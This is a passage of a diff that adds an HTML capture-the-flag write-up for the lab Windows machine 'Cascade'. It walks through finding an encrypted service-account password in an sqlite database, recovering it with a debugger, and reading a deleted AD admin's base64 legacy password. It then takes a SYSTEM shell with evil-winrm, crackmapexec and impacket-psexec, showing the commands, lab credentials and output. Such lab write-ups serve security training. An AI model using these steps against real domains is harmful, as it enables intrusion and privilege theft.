+
+    <p>We will open this file with sqlite3.</p>
+
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">sqlite</span><span class="o">&gt;</span> <span class="p">.</span><span class="k">schema</span>
+  <span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">NOT</span> <span class="k">EXISTS</span> <span class="nv">"Ldap"</span> <span class="p">(</span>
+          <span class="nv">"Id"</span>    <span class="nb">INTEGER</span> <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="n">AUTOINCREMENT</span><span class="p">,</span>
+          <span class="nv">"uname"</span> <span class="nb">TEXT</span><span class="p">,</span>
+          <span class="nv">"pwd"</span>   <span class="nb">TEXT</span><span class="p">,</span>
+          <span class="nv">"domain"</span>        <span class="nb">TEXT</span>
+  <span class="p">);</span>
+  <span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">sqlite_sequence</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">seq</span><span class="p">);</span>
+  <span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">NOT</span> <span class="k">EXISTS</span> <span class="nv">"Misc"</span> <span class="p">(</span>
+          <span class="nv">"Id"</span>    <span class="nb">INTEGER</span> <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="n">AUTOINCREMENT</span><span class="p">,</span>
+          <span class="nv">"Ext1"</span>  <span class="nb">TEXT</span><span class="p">,</span>
+          <span class="nv">"Ext2"</span>  <span class="nb">TEXT</span>
+  <span class="p">);</span>
+  <span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">NOT</span> <span class="k">EXISTS</span> <span class="nv">"DeletedUserAudit"</span> <span class="p">(</span>
+          <span class="nv">"Id"</span>    <span class="nb">INTEGER</span> <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="n">AUTOINCREMENT</span><span class="p">,</span>
+          <span class="nv">"Username"</span>      <span class="nb">TEXT</span><span class="p">,</span>
+          <span class="nv">"Name"</span>  <span class="nb">TEXT</span><span class="p">,</span>
+          <span class="nv">"DistinguishedName"</span>     <span class="nb">TEXT</span>
+  <span class="p">);</span>
+</code></pre></div>    </div>
+
+    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">sqlite</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">Ldap</span><span class="p">;</span>
+  <span class="mi">1</span><span class="o">|</span><span class="n">ArkSvc</span><span class="o">|</span><span class="n">BQO5l5Kj9MdErXx6Q6AGOw</span><span class="o">==|</span><span class="k">cascade</span><span class="p">.</span><span class="k">local</span>
+    
+  <span class="n">sqlite</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">Misc</span><span class="p">;</span>
+    
+  <span class="n">sqlite</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">DeletedUserAudit</span><span class="p">;</span>
+  <span class="mi">6</span><span class="o">|</span><span class="n">test</span><span class="o">|</span><span class="n">Test</span>
+  <span class="n">DEL</span><span class="p">:</span><span class="n">ab073fb7</span><span class="o">-</span><span class="mi">6</span><span class="n">d91</span><span class="o">-</span><span class="mi">4</span><span class="n">fd1</span><span class="o">-</span><span class="n">b877</span><span class="o">-</span><span class="mi">817</span><span class="n">b9e1b0e6d</span><span class="o">|</span><span class="n">CN</span><span class="o">=</span><span class="n">Test</span><span class="err">\</span><span class="mi">0</span><span class="n">ADEL</span><span class="p">:</span><span class="n">ab073fb7</span><span class="o">-</span><span class="mi">6</span><span class="n">d91</span><span class="o">-</span><span class="mi">4</span><span class="n">fd1</span><span class="o">-</span><span class="n">b877</span><span class="o">-</span><span class="mi">817</span><span class="n">b9e1b0e6d</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Deleted</span> <span class="n">Objects</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="k">cascade</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="k">local</span>
+  <span class="mi">7</span><span class="o">|</span><span class="n">deleted</span><span class="o">|</span><span class="n">deleted</span> <span class="n">guy</span>
+  <span class="n">DEL</span><span class="p">:</span><span class="mi">8</span><span class="n">cfe6d14</span><span class="o">-</span><span class="n">caba</span><span class="o">-</span><span class="mi">4</span><span class="n">ec0</span><span class="o">-</span><span class="mi">9</span><span class="n">d3e</span><span class="o">-</span><span class="mi">28468</span><span class="n">d12deef</span><span class="o">|</span><span class="n">CN</span><span class="o">=</span><span class="n">deleted</span> <span class="n">guy</span><span class="err">\</span><span class="mi">0</span><span class="n">ADEL</span><span class="p">:</span><span class="mi">8</span><span class="n">cfe6d14</span><span class="o">-</span><span class="n">caba</span><span class="o">-</span><span class="mi">4</span><span class="n">ec0</span><span class="o">-</span><span class="mi">9</span><span class="n">d3e</span><span class="o">-</span><span class="mi">28468</span><span class="n">d12deef</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Deleted</span> <span class="n">Objects</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="k">cascade</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="k">local</span>
+  <span class="mi">9</span><span class="o">|</span><span class="n">TempAdmin</span><span class="o">|</span><span class="n">TempAdmin</span>
+  <span class="n">DEL</span><span class="p">:</span><span class="mi">5</span><span class="n">ea231a1</span><span class="o">-</span><span class="mi">5</span><span class="n">bb4</span><span class="o">-</span><span class="mi">4917</span><span class="o">-</span><span class="n">b07a</span><span class="o">-</span><span class="mi">75</span><span class="n">a57f4c188a</span><span class="o">|</span><span class="n">CN</span><span class="o">=</span><span class="n">TempAdmin</span><span class="err">\</span><span class="mi">0</span><span class="n">ADEL</span><span class="p">:</span><span class="mi">5</span><span class="n">ea231a1</span><span class="o">-</span><span class="mi">5</span><span class="n">bb4</span><span class="o">-</span><span class="mi">4917</span><span class="o">-</span><span class="n">b07a</span><span class="o">-</span><span class="mi">75</span><span class="n">a57f4c188a</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Deleted</span> <span class="n">Objects</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="k">cascade</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="k">local</span>
+  <span class="n">sqlite</span><span class="o">&gt;</span>
+</code></pre></div>    </div>
+
+    <p>We have the password of the user ArkSvc, however it is encrypted. Before we continue, we will enumerate ldap a bit more.</p>
+
+    <p><img src="Cascade%20c4ca7fd3cd6842f5ac17028e28aa9c57/Untitled.png" alt="Untitled" /></p>
+
+    <p>User Arksvc is part of AD Recycle Bin, what means that he can see the data for delete objects, such as <code class="language-plaintext highlighter-rouge">TempAdmin</code>.  TempAdmin had the same password as the current administrator account. Maybe we can obtain the password from this deleted user.</p>
+  </li>
+</ul>
+
+<h1 id="obtaining-arksvc-password">Obtaining Arksvc password.</h1>
+
+<p>This entire binary probably uses Arksvc account to delete user. I infier this because in the database we have all the deleted objects. So let’s analyse it. We will use DnsSpy for this.</p>
+
+<p><img src="Cascade%20c4ca7fd3cd6842f5ac17028e28aa9c57/Untitled%201.png" alt="Untitled" /></p>
+
+<p>Here we can see the portion of the code that decrypts the password. We could create a script in python that uses the key and the IV (that can be foundin the <strong>CascCrypto.dll</strong> file) to decrypt the password. We could also run the program and set a breakpoint to see the value of the variable <strong>password</strong>.</p>
+
+<p><img src="Cascade%20c4ca7fd3cd6842f5ac17028e28aa9c57/Untitled%202.png" alt="Untitled" /></p>
+
+<p>Now we run the script in debug mode and when it arrives this part  we should see the password decrypted.</p>
+
+<p><img src="Cascade%20c4ca7fd3cd6842f5ac17028e28aa9c57/Untitled%203.png" alt="Untitled" /></p>
+
+<p><img src="Cascade%20c4ca7fd3cd6842f5ac17028e28aa9c57/Untitled%204.png" alt="Untitled" /></p>
+
+<p>Credentials → <code class="language-plaintext highlighter-rouge">Arksvc:w3lc0meFr31nd</code> .</p>
+
+<h1 id="domain-admin-privilege-escalation">Domain admin privilege escalation</h1>
+
+<p>The final step is to become domain admin of the domain. First we connect using <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="k">cascade</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span>  <span class="o">-</span><span class="n">i</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">182</span> <span class="o">-</span><span class="n">u</span> <span class="n">arksvc</span> <span class="o">-</span><span class="n">p</span> <span class="n">w3lc0meFr31nd</span>
+                                        
+<span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span> <span class="n">shell</span> <span class="n">v3</span><span class="p">.</span><span class="mi">5</span>
+                                        
+<span class="n">Warning</span><span class="p">:</span> <span class="n">Remote</span> <span class="n">path</span> <span class="n">completions</span> <span class="k">is</span> <span class="n">disabled</span> <span class="n">due</span> <span class="k">to</span> <span class="n">ruby</span> <span class="n">limitation</span><span class="p">:</span> <span class="n">quoting_detection_proc</span><span class="p">()</span> <span class="k">function</span> <span class="k">is</span> <span class="n">unimplemented</span> <span class="k">on</span> <span class="n">this</span> <span class="n">machine</span>
+                                        
+<span class="k">Data</span><span class="p">:</span> <span class="k">For</span> <span class="k">more</span> <span class="n">information</span><span class="p">,</span> <span class="k">check</span> <span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span> <span class="n">GitHub</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">Hackplayers</span><span class="o">/</span><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span><span class="o">#</span><span class="n">Remote</span><span class="o">-</span><span class="n">path</span><span class="o">-</span><span class="k">completion</span>
+                                        
+<span class="n">Info</span><span class="p">:</span> <span class="n">Establishing</span> <span class="k">connection</span> <span class="k">to</span> <span class="n">remote</span> <span class="n">endpoint</span>
+<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">arksvc</span><span class="err">\</span><span class="n">Documents</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>From here we will check the deleted AD objects, since this user has that privilege because is part of <strong>AD Recycle Bin</strong> group.</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Get</span><span class="o">-</span><span class="n">ADObject</span> <span class="o">-</span><span class="n">filter</span> <span class="s1">'isDeleted -eq $true'</span> <span class="o">-</span><span class="n">includeDeletedObjects</span> <span class="o">-</span><span class="n">Properties</span> <span class="o">*</span>
+</code></pre></div></div>
+
+<p>In the output we will see an interesting field.</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cascadeLegacyPwd</span>                <span class="p">:</span> <span class="n">YmFDVDNyMWFOMDBkbGVz</span>
+<span class="n">CN</span>                              <span class="p">:</span> <span class="n">TempAdmin</span>
+                                  <span class="n">DEL</span><span class="p">:</span><span class="n">f0cc344d</span><span class="o">-</span><span class="mi">31</span><span class="n">e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span>
+<span class="n">codePage</span>                        <span class="p">:</span> <span class="mi">0</span>
+<span class="n">countryCode</span>                     <span class="p">:</span> <span class="mi">0</span>
+<span class="n">Created</span>                         <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">08</span> <span class="n">AM</span>
+<span class="n">createTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">08</span> <span class="n">AM</span>
+<span class="n">Deleted</span>                         <span class="p">:</span> <span class="k">True</span>
+<span class="n">Description</span>                     <span class="p">:</span>
+<span class="n">DisplayName</span>                     <span class="p">:</span> <span class="n">TempAdmin</span>
+</code></pre></div></div>
+
+<p>If we decode this password we will obtain the password of the user Administrator.</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">audit</span><span class="p">]</span>
+<span class="err">└─</span><span class="o">#</span> <span class="n">echo</span> <span class="s1">'YmFDVDNyMWFOMDBkbGVz'</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span>
+</code></pre></div></div>
+
+<p>Credentials → <code class="language-plaintext highlighter-rouge">Administrator:baCT3r1aN00dles</code></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="k">cascade</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">182</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'Administrator'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'baCT3r1aN00dles'</span>
+<span class="n">SMB</span>         <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">182</span>    <span class="mi">445</span>    <span class="n">CASC</span><span class="o">-</span><span class="n">DC1</span>         <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mi">6</span><span class="p">.</span><span class="mi">1</span> <span class="n">Build</span> <span class="mi">7601</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">CASC</span><span class="o">-</span><span class="n">DC1</span><span class="p">)</span> <span class="p">(</span><span class="k">domain</span><span class="p">:</span><span class="k">cascade</span><span class="p">.</span><span class="k">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="k">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="k">False</span><span class="p">)</span>
+<span class="n">SMB</span>         <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">182</span>    <span class="mi">445</span>    <span class="n">CASC</span><span class="o">-</span><span class="n">DC1</span>         <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="k">cascade</span><span class="p">.</span><span class="k">local</span><span class="err">\</span><span class="n">Administrator</span><span class="p">:</span><span class="n">baCT3r1aN00dles</span> <span class="p">(</span><span class="n">Pwn3d</span><span class="o">!</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">machines</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="k">cascade</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="n">impacket</span><span class="o">-</span><span class="n">psexec</span> <span class="s1">'cascade.local/Administrator:baCT3r1aN00dles@10.10.10.182'</span>     
+<span class="n">Impacket</span> <span class="n">v0</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">shares</span> <span class="k">on</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">182</span><span class="p">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="k">Found</span> <span class="n">writable</span> <span class="k">share</span> <span class="k">ADMIN</span><span class="err">$</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploading</span> <span class="n">file</span> <span class="n">DcoHEJsJ</span><span class="p">.</span><span class="n">exe</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">SVCManager</span> <span class="k">on</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">182</span><span class="p">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">service</span> <span class="n">NewD</span> <span class="k">on</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">182</span><span class="p">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">service</span> <span class="n">NewD</span><span class="p">.....</span>
+<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
+<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="k">Version</span> <span class="mi">6</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">7601</span><span class="p">]</span>
+<span class="n">Copyright</span> <span class="p">(</span><span class="k">c</span><span class="p">)</span> <span class="mi">2009</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span>  <span class="k">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+
+<span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">system32</span><span class="o">&gt;</span> <span class="n">whoami</span>
+<span class="n">nt</span> <span class="n">authority</span><span class="err">\</span><span class="k">system</span>
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
